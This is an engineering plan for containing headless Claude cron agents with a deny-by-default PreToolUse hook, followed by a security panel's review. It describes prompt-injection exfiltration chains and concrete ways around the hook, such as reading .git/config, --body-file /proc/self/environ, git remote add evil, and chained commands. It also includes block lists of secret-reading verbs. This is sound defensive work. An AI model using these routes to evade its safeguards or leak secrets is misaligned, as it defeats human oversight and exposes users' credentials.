---
title: "Re-fix cron bwrap-userns failure — hook-primary deny-by-default containment (v3, supersedes v2)"
type: fix
date: 2026-06-08
branch: feat-one-shot-5000-5004-cron-sandbox-bwrap-fix
lane: cross-domain
brand_survival_threshold: single-user incident
requires_cpo_signoff: true
cpo_signoff: APPROVE-WITH-CONDITIONS (2026-06-08 — C-BLOCKER + C1–C3; see Security Panel Findings)
supersedes: knowledge-base/project/plans/2026-06-08-fix-cron-sandbox-dontask-allowlist-tiered-plan.md
status: v3 DRAFT — security panel found P0 holes; v3.1 revisions REQUIRED before /work (see final section). Do NOT implement as written above.
resolves_now: ["#5004"]
defers_to_followup: ["#5000"]
---

# Re-fix cron bwrap-userns failure — hook-primary containment (v3)

🐛 **Why a third plan.** v1 (`bypassPermissions`, draft #5018) was P1-blocked as a credential-exfil vector. v2 replaced it with per-producer `--allowedTools` allowlists (L1) made fail-closed by `defaultMode` (`dontAsk`/`default`), with a `permissions.deny` floor (L2) and a PreToolUse hook as backstop (L3). **Phase-0 gating probes against the installed `claude` CLI 2.1.168 falsified the v2 premise** (committed evidence: `knowledge-base/project/specs/feat-one-shot-5000-5004-cron-sandbox-bwrap-fix/phase0-probe-results-AC0.md`). This v3 inverts the design: the **PreToolUse hook becomes the PRIMARY deny-by-default control** — the only mechanism empirically proven to fail-close in headless `claude --print`.

## Phase-0 Probe Evidence (all run live; the empirical spine of this plan)

| Probe | Question | Result |
|---|---|---|
| **D0a** | Does any `defaultMode` (dontAsk/default/auto) make `--allowedTools` fail-CLOSED in headless `--print`? | **NO — fail-OPEN.** `uname -a`, `cat /proc/self/environ` ran under all three modes. `--allowedTools` is not enforced headless. |
| **D0b** | Does `permissions.deny: Read(/proc/**)` stop `cat /proc/self/environ` via Bash? | **NO.** The `Read(...)` deny governs the Read *tool*, not a `cat` through the Bash tool. |
| **D0c** | Can a `PreToolUse` hook deny a Bash command by inspecting `tool_input.command`? | **YES.** Denied `cat /proc/self/environ` + `printenv`; allowed `echo`. |
| **D-new-3** | Does a **deny-by-default** hook (allow only allowlisted prefixes) work as a real fail-closed Bash allowlist? | **YES.** `echo`(allowlisted)→ok; `uname`/`cat /proc`→DENIED (not-allowlisted); redirect variant→DENIED (metachar). |
| **D-new-1** | When the hook script **crashes (exit 1) or is missing**, does claude fail CLOSED? | **NO — fail-OPEN (critical).** `uname -a` ran in BOTH cases. A crashed/absent hook = "no decision" → falls through to the (fail-open) permission layer. |
| **D-new-2** | Can a `PreToolUse` `Write\|Edit` matcher deny a Write to a protected path (the hook itself)? | **YES.** Write to `hook.sh` denied; file intact. Closes the hook-rewrite bypass. |

**Load-bearing conclusions:**
1. The hook is the ONLY fail-closed control. `--allowedTools` and `permissions.deny` are documented defense-in-depth, NOT relied upon.
2. **Deny-by-default** (allow only matched, deny everything else) is mandatory — a deny-on-pattern blocklist inherits the v2 incompleteness.
3. **The hook fails OPEN on its own failure (D-new-1).** This is the single biggest robustness risk and forces a **spawn-time hook self-test** (below). Without it, one mistyped path = silent fleet-wide fail-open.
4. The model-writable ephemeral clone means the hook must **self-protect** (`Write|Edit` matcher denies writes to the hook, settings, `.claude/`) — D-new-2 proves this works.

## Overview

**The availability bug (unchanged, real):** crons spawn `claude --print` headless; the OS bash sandbox (bubblewrap) auto-approved their `Bash` calls. When the cloud runner's bwrap cannot acquire unprivileged user namespaces (`kernel.apparmor_restrict_unprivileged_userns` drift), every `Bash` fails and the cron self-reports FAILED (#5000 growth-audit, #5004 roadmap-review). The host systemd pin (#4932) recurred 4 days later, so the durable fix removes the cron path's dependency on unprivileged userns: `sandbox.enabled:false`.

**Why `sandbox:false` alone is unsafe, and why v3's hook fixes it:** removing the sandbox removes the only thing containing headless bash (it auto-approved, but bwrap network-jailed it). With the sandbox off, headless `--print` auto-approves all non-denied commands (D0a) and there is no network jail. The v2 attempt to restore containment via `--allowedTools` fails-open (D0a). v3 restores containment with a **deny-by-default PreToolUse hook** that re-implements the allowlist at the one layer that actually fires (D0c/D-new-3), keeps secrets out of model context (every env/secret-read command is non-allowlisted → denied), and denies egress.

**The exfil chain and how v3 severs it:** exfil needs (a) a secret in model context AND (b) egress. The deny-by-default hook denies every command that could do (a) — `cat`, `env`, `printenv`, `set`, reads of `/proc`, `.env`, `.git/config`, `gh auth token` — because none is allowlisted. With no secret in context, the allowed egress-capable verbs (`gh issue create --body`, `git push`) cannot leak a secret they never saw. Both halves are cut at the hook.

**Residual risk (Tier-2):** the hook's guarantee is bounded by (i) its reachability + non-crashing (D-new-1 mitigation = spawn-time self-test), (ii) its self-protection (D-new-2), and (iii) parser correctness on compound commands. The DEFINITIVE containment for crons needing arbitrary `bash <script>` remains the **Tier-2 network-egress firewall** (deferred, filed). v3 Tier-1 = hook-contained crons (roadmap-review #5004 + any cron expressible as a finite command allowlist). Broad/raw-`spawn("bash")` crons go fail-closed → Tier-2.

## Research Reconciliation — v2 claims carried / corrected

| v2 claim | v3 status |
|---|---|
| L1 per-producer `--allowedTools` is the primary fail-closed control | **FALSIFIED (D0a).** Inverted: the PreToolUse hook is primary; `--allowedTools` is cosmetic headless. |
| L2 `Read(/proc/**)` deny stops `cat /proc/self/environ` | **FALSIFIED (D0b).** Removed as a relied-upon control; deny-by-default hook covers it (cat not allowlisted). |
| L3 hook is a backstop | **PROMOTED to primary (D0c/D-new-3).** |
| Blast radius = 12 substrate-claude crons | **CONFIRMED** (`git grep -lE '(^|[",])Bash([,"])' …/cron-*.ts` = 12). |
| 3 raw-`spawn("bash")` crons uncontained by claude-code layer | **CARRIED** — Tier-2 only (the hook governs claude-code Bash, not Node-level `spawn`). |
| community-monitor read-auth tokens must not be silently stripped | **CARRIED** (CPO C1/C2). |
| roadmap-review ingests untrusted GitHub issue bodies | **CARRIED** — its Tier-1 safety rests entirely on the hook + secret-out-of-context. |
| `dontAsk` settings.json acceptance unverified | **RESOLVED** — `dontAsk` is accepted but fail-OPEN (D0a); irrelevant to v3. |

## User-Brand Impact

**If this lands broken, the user experiences:** a non-technical founder's automated roadmap/growth/community crons silently stop producing their weekly `[Scheduled] …` GitHub issues (the #5000/#5004 symptom) — OR, the mode this plan exists to prevent, a cron's agent (steered by injected GitHub-issue/web/social content) exfiltrates `ANTHROPIC_API_KEY` (billing abuse) or the broadly-scoped `GH_TOKEN` (`gh pr merge --auto` on the public auto-deploying repo).

**If this leaks, the user's money / repo / brand is exposed via:** an injected agent reading a secret (`cat /proc/self/environ`, `gh auth token`, `git config remote.origin.url`) and posting it to a public `gh issue create --body`, or `git push`-redirecting the authed clone. v3 severs this by making every secret-read command non-allowlisted (denied) so the secret never enters context.

**Brand-survival threshold:** `single-user incident`. `requires_cpo_signoff: true`. `user-impact-reviewer` + `security-sentinel` run at review. The hook's fail-open-on-crash (D-new-1) is itself a brand-survival failure mode — the spawn-time self-test is its mitigation and carries a behavioral test.

## Design

### D0 — Phase-0 probes (DONE; evidence committed)

All six probes above were run live against 2.1.168. AC0 is satisfied by `phase0-probe-results-AC0.md`. **One probe remains for /work Phase 0:** D-new-1b — confirm the *spawn-time self-test* (below) actually aborts the cron when the hook is unreachable (the positive control for the mitigation).

### D1 — The deny-by-default PreToolUse hook (NEW — the primary control)

New file `plugins/soleur/skills/<cron-containment>/scripts/cron-bash-allowlist-hook.sh` (final path at /work; must be inside the repo so the `--depth=1` clone contains it). Contract:

- **Input:** PreToolUse JSON on stdin. Extract `tool_name` + `tool_input.command`/`tool_input.file_path` via **`node -e`** (node is guaranteed in the web-platform container; jq is not). NEVER parse JSON with bash string-munging.
- **Fail-closed internally:** ANY internal error (parse failure, empty command, unexpected shape) → emit `permissionDecision:"deny"`, `exit 0`. The hook MUST NOT `exit 1` or crash (D-new-1 proved a crash fails OPEN). Wrap the whole body so the default path is deny.
- **Matcher `Bash`:** deny-by-default.
  1. Reject unconditionally if the command contains substitution/obfuscation/redirection metacharacters: `$(`, `` ` ``, `${`, `<(`, `>(`, `>`, `>>`, `<`, `|`, `&` (background; `&&` handled below), newline. These are the exfil/obfuscation primitives; no Tier-1 cron command needs them.
  2. Split on `&&`, `;`, `||` into segments. For EACH segment, trim and match the leading verb against the cron's allowlist (passed via env `SOLEUR_CRON_ALLOW` or baked per-cron). If ANY segment fails → deny the whole command.
  3. Allow only if every segment matches. Use **sub-command granularity** (`gh issue list`, NOT `gh issue`); `git config`, `gh auth`, `gh secret`, `gh gist` are NEVER allowlisted (P0-2 carry-forward).
- **Matcher `Write|Edit`:** deny any `file_path` under `.claude/`, the hook's own path, `settings.json`, `.git/`, or `**/.env*` (self-protection — D-new-2). Allow other writes (the ephemeral clone is throwaway; writes can't exfil without egress, which is denied).
- The hook is registered in `DEFAULT_CLAUDE_SETTINGS.hooks.PreToolUse` with two matcher entries (`Bash` and `Write|Edit`) pointing at the same script (it branches on `tool_name`).

### D2 — Spawn-time hook self-test (NEW — mitigates D-new-1 fail-open)

In `_cron-claude-eval-substrate.ts`, after `setupEphemeralWorkspace` writes settings + before spawning the real agent, run the hook ONCE against a canonical denied payload and a canonical allowed payload:

```ts
// pseudo: echo '{"tool_name":"Bash","tool_input":{"command":"cat /proc/self/environ"}}' | bash <hookPath>
// assert stdout contains '"permissionDecision":"deny"'  → else THROW (abort cron, self-report FAILED)
// echo '{"tool_name":"Bash","tool_input":{"command":"gh issue list"}}' | bash <hookPath>  (for an allow-listed cron)
// assert '"permissionDecision":"allow"'  → else THROW
```

If the self-test fails (hook missing, node missing, returns allow for the bad payload), the cron MUST abort with a FAILED self-report (the #4978/#4988 output-missing path) rather than spawn unprotected. This converts D-new-1's fail-open into fail-closed at the orchestration layer.

### D3 — `_cron-claude-eval-substrate.ts` `DEFAULT_CLAUDE_SETTINGS` rewrite

Replace the `bypassPermissions` overlay (`:141-149`) with:

```jsonc
{
  permissions: {
    defaultMode: "default",          // irrelevant to containment (D0a) — the hook is the control
    allow: [],
    deny: [ /* best-effort defense-in-depth ONLY — the egress/interpreter/secret-read verbs
               from v2 D1; documented as NON-load-bearing. The hook is the real control. */ ],
  },
  hooks: {
    PreToolUse: [
      { matcher: "Bash",       hooks: [{ type: "command", command: "<hook>" }] },
      { matcher: "Write|Edit", hooks: [{ type: "command", command: "<hook>" }] },
    ],
  },
  sandbox: { enabled: false },         // the host-independence bug fix
}
```

Rewrite the file's comment block to remove ALL `bypassPermissions` rationale and document the hook-primary model + the D-new-1 self-test requirement.

### D4 — roadmap-review (#5004): per-cron allowlist passed to the hook

`cron-roadmap-review.ts` — pass the cron's command allowlist to the hook (env var or generated settings). Enumerate every verb the prompt at `:112-178` runs (sub-command granularity, prompt-matched, tested AC4b): `gh issue create/list/edit/close/comment`, `gh pr list/create/comment`, `gh api repos/jikig-ai/soleur/…` (resolve the single-quote matching — AC4b), `git checkout/add/commit/push`. Drop bare `Bash`, drop vestigial `WebSearch`/`WebFetch`. AC4c: if a needed verb is withheld, the prompt fails loud (no GREEN-monitor partial run — `resolveOutputAwareOk` keys only on issue existence).

### D5 — community-monitor (carry-forward, CPO C1/C2)

`cron-community-monitor.ts` keeps `ANTHROPIC_API_KEY`+`GH_TOKEN` and the read-auth tokens the router needs (`community-router.sh:32` detects platforms by token presence). No silent strip; any disabled platform is surfaced. community-monitor's *bash* containment stays Tier-2 (it needs broad bash).

### D6 — Deferred-cron observability (carry-forward)

Broad crons whose needs can't be expressed as a finite allowlist go fail-closed (hook denies their commands → self-report FAILED). Before merge, for each deferred cron: pause its Inngest schedule (preferred) or mute the Sentry monitor with a Tier-2 link, AND self-label the fallback audit issue `tier-2-deferred`.

## Files to Edit (Tier-1 / this PR)

- `apps/web-platform/server/inngest/functions/_cron-claude-eval-substrate.ts` — D2 (spawn-time self-test) + D3 (overlay rewrite + comment rewrite).
- `apps/web-platform/server/inngest/functions/cron-roadmap-review.ts` — D4.
- `apps/web-platform/server/inngest/functions/cron-community-monitor.ts` — D5.
- The other ~10 substrate-claude crons — pass their (mostly empty / minimal) allowlist; broad ones go fail-closed (D6).
- `apps/web-platform/test/server/inngest/cron-claude-eval-substrate.test.ts` — rewrite to assert the hook registration + the D2 self-test + BEHAVIORAL deny tests (AC2b).
- `apps/web-platform/test/server/inngest/cron-bash-allowlist-hook.test.ts` — **new** — unit tests on the hook parser (adversarial compound/substitution inputs) + the prompt-command match (AC4b).
- Inngest schedule / Sentry-monitor config for the deferred set — D6.
- `knowledge-base/engineering/operations/runbooks/cloud-scheduled-tasks.md` — hook-primary containment model; `sandbox:false`; the D-new-1 self-test; #4932/#4944 as non-cron defense-in-depth; Tier-2 deferral.
- `knowledge-base/engineering/architecture/decisions/ADR-033-*.md` — amend (I7): containment = `sandbox:false` + deny-by-default PreToolUse hook (Bash + Write/Edit matchers) + spawn-time self-test; `--allowedTools`/`permissions.deny` are non-load-bearing headless; raw-`spawn("bash")` crons need Tier-2 firewall.

## Files to Create

- `plugins/soleur/skills/<cron-containment>/scripts/cron-bash-allowlist-hook.sh` (D1; final path at /work).
- `knowledge-base/project/learnings/integration-issues/<topic>.md` — headless `claude --print` is deny-list/hook-driven, not allow-list-driven; the hook fails OPEN on crash (→ spawn-time self-test); Read-deny doesn't cover Bash `cat`; deny-by-default hook is the real fail-closed allowlist. (Date at write-time.)

## Open Code-Review Overlap

To be re-checked at /work against open `code-review` issues for the final edited-file list (v2 found only `github-app.ts` #2246, a Tier-2 file — not edited here). Disposition: acknowledge unless the file set changes.

## Acceptance Criteria

### Pre-merge (PR)

- [ ] **AC0 (gating, DONE)** — D0a/D0b/D0c/D-new-1/D-new-2/D-new-3 evidence in `phase0-probe-results-AC0.md`. PLUS D-new-1b: the D2 self-test aborts the cron when the hook is unreachable (positive control; behavioral test).
- [ ] **AC1** — `DEFAULT_CLAUDE_SETTINGS` parsed JSON: `sandbox.enabled===false`; `hooks.PreToolUse` has BOTH a `Bash` and a `Write|Edit` matcher pointing at the hook; `allow===[]`; the token `"bypassPermissions"` appears nowhere as a JSON value (scope to parsed value, not comment bytes).
- [ ] **AC2b (behavioral, the core)** — a real `claude --print` spawn with the overlay: `cat /proc/self/environ` DENIED; `uname -a` (non-allowlisted) DENIED; `curl http://example.com` DENIED; a Write to `.claude/settings.json` DENIED; an allowlisted `gh issue list` ALLOWED. Assert refusal/exit, not string presence.
- [ ] **AC2c (fail-closed-on-crash)** — with the hook script `chmod -x`'d / path broken, the D2 self-test THROWS and the cron self-reports FAILED (never spawns unprotected).
- [ ] **AC3** — `git grep -nE '(^|[",])Bash([,"])' …/cron-*.ts` informs the per-cron allowlists; the 12 substrate-claude crons are each classified Tier-1 (hook-allowlistable) or Tier-2 (fail-closed).
- [ ] **AC4b** — unit test over roadmap-review's verbatim prompt commands: each `gh …`/`git …` matches an allow pattern in the hook (incl. the single-quoted `gh api 'repos/jikig-ai/soleur/…'` form).
- [ ] **AC4c** — roadmap-review allows every git verb its prompt needs, or fails loud on a denied verb (no GREEN-monitor partial run).
- [ ] **AC5** — community-monitor `buildSpawnEnv` keeps `ANTHROPIC_API_KEY`+`GH_TOKEN`+read-auth tokens; any disabled platform is surfaced, not silent.
- [ ] **AC6** — `vitest run apps/web-platform/test/server/inngest/` green; `cd apps/web-platform && ./node_modules/.bin/tsc --noEmit` clean; `bash scripts/test-all.sh` green.
- [ ] **AC7** — repo-root `.claude/settings.json` UNCHANGED.
- [ ] **AC8** — the 3 raw-`spawn("bash")` crons (`content-publisher`, `content-vendor-drift`, `rule-prune`) named in the Tier-2 issue as uncontained by the hook (Node-level spawn bypasses the claude-code hook).
- [ ] **AC9** — D6 applied: deferred-set Inngest schedules paused OR monitors muted-with-link; FAILED audit issues self-label `tier-2-deferred`.
- [ ] **AC10** — PR body uses `Ref #5000` + `Ref #5004` (NOT `Closes`); Tier-2 + daily-triage-audit follow-up issue numbers linked.

### Post-merge (operator-automatable; no SSH)

- [ ] **AC11** — deploy lands; `/soleur:trigger-cron` → `cron/roadmap-review.manual-trigger`; confirm `[Scheduled] Weekly Roadmap Review …` issue produced end-to-end → `gh issue close 5004` linking the PR. (#5004 RESOLVED.)
- [ ] **AC12** — `/soleur:trigger-cron` across Tier-1 candidates; record pass/fail per cron in the Tier-2 issue.
- [ ] **AC13** — confirm #5000 self-reports FAILED-contained (not silent), labeled `tier-2-deferred`, left OPEN.

## Observability

```yaml
liveness_signal:
  what: per-cron Sentry check-in (postSentryHeartbeat) + output-aware verify-output step; PLUS the D2 self-test result in the cron's structured log
  cadence: each cron's schedule (roadmap-review Mon 09:00 UTC) + manual-trigger; deferred set paused (D6)
  alert_target: Sentry cron monitors (scheduled-roadmap-review, …)
  configured_in: cron-*.ts verify-output/sentry-heartbeat; _cron-claude-eval-substrate.ts D2 self-test; infra/sentry/cron-monitors.tf
error_reporting:
  destination: Sentry via reportSilentFallback; stderrTail/stdoutTail in scheduled-output-missing extra
  fail_loud: true — denials + a failed self-test surface as non-zero exit → output-missing → ensureScheduledAuditIssue FAILED (#4978/#4988)
failure_modes:
  - {mode: hook unreachable/crashed (D-new-1), detection: D2 spawn-time self-test THROWS, alert_route: Sentry RED + FAILED issue (NOT a silent fail-open)}
  - {mode: cron command denied by hook (Tier-2 contained), detection: output-missing + FAILED issue (tier-2-deferred), alert_route: Sentry RED + GitHub issue}
  - {mode: regression to bypassPermissions/sandbox-on/missing-hook, detection: AC1/AC2b/AC2c tests, alert_route: CI red pre-merge}
  - {mode: roadmap-review allowlist/quote mismatch denies gh api, detection: AC4b unit + AC11 trigger-cron, alert_route: no scheduled-roadmap-review issue}
logs:
  where: Sentry (tails); pino line stream to app stdout
  retention: Sentry default
discoverability_test:
  command: "gh issue list --label scheduled-roadmap-review --state open --search 'in:title Weekly Roadmap Review' --json number,createdAt   # after AC11; NO ssh"
  expected_output: a fresh issue created within the trigger window
```

## Domain Review

**Domains relevant:** Engineering (CTO + architecture-strategist), Security (security-sentinel), Flow (spec-flow-analyzer), Product (CPO — threshold gate). Not a UI feature → Product/UX Gate = NONE (no wireframes); CPO sign-off required by threshold. **The security panel runs on THIS v3 because the architecture changed materially from v2** (hook-primary, not allowlist-primary). Panel findings fold in below at /work-plan finalization.

## Sharp Edges

- **The hook fails OPEN on its own failure (D-new-1).** A mistyped path, missing `node`, a non-executable bit, or a `--depth=1` clone that omits the file = silent fleet-wide fail-open. The D2 spawn-time self-test is the ONLY thing converting this to fail-closed; it is load-bearing, not optional, and carries AC2c.
- **The hook lives in the model-writable ephemeral clone.** The `Write|Edit` self-protection matcher (D-new-2) is mandatory; without it an injected model rewrites the hook then bypasses it on the next Bash call.
- **Compound-command parsing is the parser's risk surface.** Deny substitution/redirection/background/pipe unconditionally; split on `&&`/`;`/`||` and match EVERY segment. A naive prefix match on the first verb is bypassable (`gh issue list && cat /proc/self/environ`). Unit-test adversarial inputs.
- **`--allowedTools` and `permissions.deny` are NOT containment headless (D0a/D0b).** Do not sell them as controls; document as cosmetic/defense-in-depth. The hook is the boundary.
- **Secret-out-of-context is the actual thesis, not egress-deny.** `gh issue create --body`/`git push` stay allowed for Tier-1 crons; they're safe ONLY because the model never reads a secret (all env/secret-read commands are non-allowlisted → denied). If any future change allowlists an env-read command, the chain re-opens.
- **roadmap-review partial-run is GREEN-silent** — `resolveOutputAwareOk` keys on issue existence; a denied `git push` drops the PR while the monitor stays green (AC4c).
- **Blast radius is 12 substrate-claude crons; 3 raw-`spawn("bash")` crons are uncontained by the hook** (Node-level spawn never reaches the claude-code PreToolUse layer — AC8). Tier-2 firewall is their only containment.
- **`gh api 'repos/jikig-ai/soleur/…'` is single-quoted** — confirm the hook's segment matcher strips quotes or the repo-scoped allow never matches and #5004 stays broken (AC4b).
- A plan whose `## User-Brand Impact` section is empty fails `deepen-plan` Phase 4.6 — it is filled above.

## Alternative Approaches Considered

| Approach | Why not (now) |
|---|---|
| Fleet-wide `bypassPermissions` (v1) | P1-blocked exfil primitive. |
| `--allowedTools` allowlist fail-closed via `defaultMode` (v2) | FALSIFIED — fail-open headless (D0a). |
| `permissions.deny` blocklist as primary | FALSIFIED for `cat /proc` (D0b) + incomplete-by-design. |
| Hook-primary deny-by-default (THIS) | Only mechanism proven to fail-close (D0c/D-new-3); bounded by self-test + self-protection + parser correctness. |
| Egress firewall now (one PR) | Operator chose two-PR; infra blast radius → Tier-2. Tracked. |
| Keep host-side userns pin only | #4932 recurred in 4 days; kept as non-cron defense-in-depth. |

## Deferred → tracking issues (file in /work Phase 4)

1. **Tier-2 — egress firewall + least-priv token + restore broad/raw-bash crons** (`type/security`): network-egress allowlist on the cron worker (api.anthropic.com + api.github.com + community read APIs only); narrow `generateInstallationToken`; restore #5000, bug-fixer, campaign-calendar, competitive-analysis, content-generator, seo-aeo-audit, ux-audit, community-monitor (bash), and the 3 raw-`spawn("bash")` crons. **The firewall does NOT stop `gh issue create --body $secret` to the public repo — the hook's secret-out-of-context property remains load-bearing even after Tier-2.**
2. **Audit daily-triage / follow-through-monitor allowlists** (`type/security`, low-pri): they run unsandboxed from `/app` with `defaultMode:"auto"` (fail-open per D0a) — confirm zero egress/secret-read verbs reachable; consider moving them under the same hook.

---

# Security Panel Findings & v3.1 REQUIRED Revisions (2026-06-08)

The v3 plan above was reviewed by security-sentinel, spec-flow-analyzer, architecture-strategist, and CPO at single-user-incident threshold. **Verdict: the hook-primary INVERSION is sound, but the plan has P0 holes that make it NOT shippable as written.** The design above is preserved for context; **the next session MUST implement the corrected v3.1 design below, NOT the two-matcher design in §D1.** All four reviewers' full output is in the session transcript.

## P0 — must fix before any RED

- **P0-A (security-sentinel — the central hole): the two-matcher hook does NOT contain.** The agent's `--allowedTools` also carries `Read,Glob,Grep,WebFetch,WebSearch` (`cron-roadmap-review.ts:100-101`). The §D1 hook matches only `Bash` and `Write|Edit`; **every other tool class is unhooked → fail-open** (D-new-1 generalizes: any tool the hook doesn't explicitly deny RUNS). Exfil chain that survives the v3 design: `Read(.git/config)` returns the `GH_TOKEN` (`buildAuthenticatedCloneUrl` `_cron-shared.ts:108` writes `https://x-access-token:${token}@github.com/...` into `.git/config`) → model calls allowlisted `gh issue create --body "<token>"` → leaked to the public repo. `Read(/proc/self/environ)` likewise returns `ANTHROPIC_API_KEY`. **"Secret-out-of-context" is FALSE** with Read/Grep/Glob unhooked. **Fix:** the hook must be deny-by-default at the **tool-class** level — a catch-all matcher (`*`) that denies any unrecognized tool, PLUS a `Read|Glob|Grep` matcher denying `.git/**`, `/proc/**`, `**/.env*`, `.claude/`, `settings.json`, and paths under the passed `HOME`. Root-cause alternative (cleanest): **stop persisting the token in `remote.origin.url`** — post-clone `git remote set-url origin <tokenless>` + a credential helper, removing the on-disk secret P0-A depends on.
- **P0-B (security-sentinel — argument injection):** even with P0-A fixed, allowlisted verbs read files via flags: `gh issue create --body-file /proc/self/environ`, `gh api -f body=@.git/config`, `git remote add evil <url> && git push evil`. **Verb-matching is insufficient — the hook must inspect ARGUMENTS:** deny `--body-file`/`-F`/`--field @`/`@`-file forms, `git remote`, and `git push` to any remote other than `origin`. §D1.3 names only `git config`; `git remote`, `git remote get-url`, `git ls-remote`, `git config -l` also surface the tokenized URL — enumerate-deny all.
- **P0-C (arch + spec-flow — delivery mechanism mis-stated):** §D1/§Sharp-Edges claim the hook ships via the `--depth=1` clone. **FALSE:** `setupEphemeralWorkspace` (`_cron-claude-eval-substrate.ts:184-188`) `rm -rf`s the clone's `plugins/soleur` and **symlinks it to `getPluginPath()` → `/app/shared/plugins/soleur`** (the deployed image mount, `plugin-path.ts:17`). The hook ships via the **container image**. Consequences: (a) the §D1 placement rationale + the "clone omits file" fail-open mode are wrong; (b) a `Write` through the in-cwd symlink could poison the shared mount for **all concurrent crons AND user workspaces** (worse than D-new-2's ephemeral-clone rewrite). **Fix:** pin the realpath'd hook location; verify the `/app/shared/plugins/soleur` mount is **read-only** to the spawn (if so, hook-integrity lives in infra and the `Write|Edit` matcher is defense-in-depth; if not, that's a Tier-2 infra gap to file). Re-derive the fail-open set from the symlink-mount reality.
- **P0-D (arch — CLI version skew, gating):** the AC0 probes ran on `claude` **2.1.168**; `Dockerfile:45` pins **`@anthropic-ai/claude-code@2.1.79`**. The entire empirical spine (D0a/D0c/D-new-1/D-new-2/D-new-3) was validated on a CLI **production does not run**; PreToolUse semantics are version-sensitive. **Fix (gating, AC0 extension):** either bump the Dockerfile pin to 2.1.168 in this PR and re-run AC2b against it, OR re-run the six probes against 2.1.79 before RED. Shipping containment validated on the wrong version repeats the unverified-premise failure AC0 exists to prevent.
- **P0-E (CPO C-BLOCKER — live defer-trail broken):** #5000 and #5004 are the cron's **transient `[Scheduled] … - 2026-06-08` failure artifacts** and are both **CLOSED-COMPLETED (12:39 UTC today)** while the bug is unfixed — the silent-green hazard. `Ref #5000/#5004` (AC10/AC13) anchors the defer trail on closed transient artifacts. **Fix:** create DURABLE tracking issues — "growth-audit cron broken (bwrap-userns) — Tier-2" and "roadmap-review cron — Tier-1 fix in #5018" — in /work Phase 4, and `Ref` those, NOT the dated artifacts. Do not reopen the auto-managed artifacts (they regenerate weekly).

## P1 — must resolve in v3.1

- **P1-A (spec-flow + arch — blast radius + plumbing):** the shared `DEFAULT_CLAUDE_SETTINGS` overlay reaches **~21 producers using `setupEphemeralWorkspace`, not 12**; the 12 are only those with a literal `Bash` token. Per-cron allowlist plumbing (`SOLEUR_CRON_ALLOW`) **does not exist in any `buildSpawnEnv`** — it is 12+ files of net-new plumbing. Day-1 outcome of the overlay flip = **11 of 12 crons fail-closed** (only roadmap-review gets D4). **Fix:** enumerate ALL ~21 overlay-reached producers; classify each Tier-1/Tier-2; make **D6 schedule-pause atomic with the D3 overlay flip in the same commit** + an AC asserting no Tier-2 cron has a live Inngest schedule post-merge (else a deploy window = alert storm masking real regressions).
- **P1-B (spec-flow — allowlist must be settings-baked, not env):** `SOLEUR_CRON_ALLOW` as an env var is model-readable (reveals the capability map) and is itself an env-read surface. **Mandate the settings-baked variant; forbid env delivery.**
- **P1-C (spec-flow / arch / sentinel — AC4c is unimplementable as written):** the "fail loud on denied verb" disjunct cannot be satisfied — `resolveOutputAwareOk` (`_cron-shared.ts:277`) keys on issue existence, so a mid-prompt denied verb that already filed the issue is structurally GREEN. AC4c collapses to "allowlist everything roadmap-review needs," and the gap recurs on prompt drift. **Fix:** add a hook-deny→nonzero→treated-as-RED path distinct from max-turns (so a denied-verb exit pages even when the issue exists), OR explicitly accept-and-document GREEN-with-dropped-PR for roadmap-review (the issue is the contract, the PR is best-effort) — but resolve the §Sharp-Edge contradiction either way.
- **P1-D (self-test tests the wrong invariant — all three engineering reviewers):** D2 runs `bash <hookPath>` directly, which proves the script's logic, NOT that `claude --print` wired the hook into PreToolUse (a settings-schema typo passes D2 and fails open in the real spawn). **Fix:** the fail-closed gate must be a **real `claude --print` spawn** issuing a denied command and asserting refusal (fold into AC2b), using the **byte-identical settings-registered command string** from the **same cwd/env**; D2's allow-payload must derive from the same allowlist source D4 feeds the hook, and assert the cron's OWN first required verb is allowed (catch silently-empty allowlists). Invoke `node` by absolute path (not `PATH` lookup) to remove a `PATH`-drift fail-open.
- **P1-E (spec-flow + CPO — 4th raw-spawn cron):** AC8 names 3 raw-`spawn("bash")` crons; a **4th, `cron-weekly-analytics.ts:102`** (holds `GH_TOKEN`, Mon 06:00 UTC), is uncontained by the hook and unlisted in BOTH tiers → falls through. **Fix:** add to AC8 + the Tier-2 issue.
- **P1-F (spec-flow — metachar false-positive breaks #5004):** roadmap-review's prompt runs `gh api '…' --jq '.[] | {…}'`; the `|` is inside a quoted `--jq` arg, but the §D1.1 naive metachar scan denies it → roadmap-review fails-closed on its own first call → #5004 silently green (P1-C). **Fix:** the parser MUST tokenize quoting BEFORE the metachar reject (real shell-word-split semantics, not "strip quotes"); AC4b must cover EVERY sub-command the prompt uses incl. `gh issue list/comment/edit/close`, `gh pr list/comment`, `gh label create` (named in `cron-roadmap-review.ts:50`, absent from §D4's enumeration).

## P2 — fold opportunistically

- AC1's "`bypassPermissions` absent" is a weak proxy — assert presence of the catch-all + Read/Grep matchers and a known-safe `defaultMode`, not just the absent string.
- `HOME` passthrough exposes `~/.config/gh/hosts.yml`, `~/.claude.json` outside the clone — set `HOME` to the ephemeral root or deny-read those paths.
- `WebFetch` is a direct egress channel once a secret is in context — hook-deny it until Tier-2.
- Token also surfaces via `.git/logs/HEAD`, packed-refs — the remote-set-url root fix (P0-A) closes this whole family.
- ADR-033 I7 should be a binding invariant in the I-series register (with the negative guarantee: containment does NOT extend to Node-level `spawn`); consider a dedicated ADR for the sandbox→hook inversion. Add a "no env-read verb is EVER allowlisted" guard test — the single most fragile coupling.
- CPO C2/C3: re-confirm the `community-router.sh:32` token-presence citation; make the Tier-2 deferral issue founder-readable (which weekly outputs stop, in plain language — not cron filenames).

## CPO sign-off

**APPROVE-WITH-CONDITIONS** — two-PR scoping (defer-contained beats restore-exposed) is the correct brand call and *more* correct under v3; C1/C2 carried; User-Brand Impact concrete. Conditions: clear P0-E (durable defer trail) + P1-E (4th cron) + the community-router citation + founder-readable Tier-2 issue. Engineering correctness of the hook parser is owned by AC4b + the adversarial unit tests.

## Net assessment

The hook-primary inversion is the right response to the Phase-0 falsification, and the Tier-2 egress firewall remains the durable boundary (the hook is an interim, parser-bounded stopgap — both layers independently load-bearing). But the **two-matcher design does not contain** (P0-A), the **delivery mechanism was mis-modeled** (P0-C), and the **probes ran on the wrong CLI version** (P0-D). These are reality-divergences, not polish. v3.1 must: (1) make the hook deny-by-default at the tool-class level + argument-inspecting; (2) prefer the remote-set-url root fix; (3) correct the image-mount delivery model + verify the mount is read-only; (4) re-probe against 2.1.79; (5) enumerate all ~21 producers + atomic D6; (6) anchor the defer trail on durable issues. Then it is shippable as a Tier-1 stopgap.
